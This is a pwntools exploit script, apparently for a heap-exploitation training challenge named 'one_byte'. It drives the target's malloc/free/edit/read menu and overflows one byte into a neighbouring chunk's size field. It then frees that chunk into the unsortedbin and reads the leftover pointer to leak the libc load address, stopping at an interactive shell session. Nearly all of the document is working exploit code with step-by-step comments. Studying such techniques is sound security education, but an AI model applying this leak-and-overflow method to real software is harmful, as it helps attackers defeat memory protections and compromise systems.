#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b"> ", b"1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(0x58)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- LEAK THE UNSORTEDBIN ADDRESS -=-=-=

# Request 4 chunks.
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc() # Guard against consolidation with top chunk.

# Overflow from chunk A into chunk B's size field.
edit(chunk_A, b"Y"*88 + p8(0xc1))

# Chunk B is now a 0xc0 chunk, the sum of 2 0x60 chunks.

# Free chunk B into the unsortedbin.
free(chunk_B)

# This request remainders chunk B, writing unsortedbin metadata into chunk C.
chunk_B = malloc()

# Read from chunk C.
data = read(chunk_C)

# Unpack the 1st quadword of chunk C's user data.
unsortedbin_address = u64(data[:8])

# Calculate the offset of the main arena's unsortedbin from the start of the libc shared object.
# This is necessary because arenas have no "unsortedbin" member, otherwise we'd just use that.
unsortedbin_offset = libc.sym.main_arena + 0x58

# Calculate the libc load address by subtracting the unsortedbin offset from its address.
libc.address = unsortedbin_address - unsortedbin_offset

info(f"libc @ 0x{libc.address:02x}")

# =============================================================================

io.interactive()
